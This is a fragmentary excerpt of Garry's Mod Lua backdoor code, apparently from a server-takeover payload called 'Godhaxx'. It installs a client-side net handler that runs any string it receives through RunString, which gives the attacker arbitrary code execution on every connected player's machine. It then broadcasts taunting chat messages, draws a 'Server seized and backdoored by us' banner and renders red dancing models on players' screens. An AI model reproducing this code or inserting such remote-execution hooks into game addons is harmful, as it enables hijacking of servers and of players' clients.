util.AddNetworkString "WhatUGonnaDoNow?"
...
function lol:SendLua( pPlayer, strLua )
	net.Start( "WhatUGonnaDoNow?" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"WhatUGonnaDoNow?\", function() RunString(net.ReadString()) end)" )
end
...
lol:PushAction( 0, function( pPlayer )
    ...
    for k,v in pairs(player.GetAll()) do
	v:SendLua("chat.AddText(Color(0, 115, 255), \"Next time try to dont get backdoored!\")")
    end
    end)
	...
	lol:SendLua( pPlayer, [[
		...
		hook.Add( "HUDPaint", "newhud", function()
			...
			draw.SimpleTextOutlined(
                    "Godhaxx - Server seized and backdoored by us ;>",
				"DermaLarge",
...
lol:PushAction( 0, function( pPlayer )
	...
	lol:SendLua( pPlayer, [[
		...
		local mdl = ClientsideModel( "models/player/kleiner.mdl", RENDERGROUP_BOTH )
		mdl:SetNoDraw( true )
		...
		hook.Add( "HUDPaint", "dance", function()
			...
			for i = 1, 32 do
				...
				cam.Start3D( (ang:Forward() *64) +(ang:Up() *32), (ang:Forward()*-1):Angle(), 90, x, y, w, h )
					...
					render.SetColorModulation( 1.5, 0, 0 )
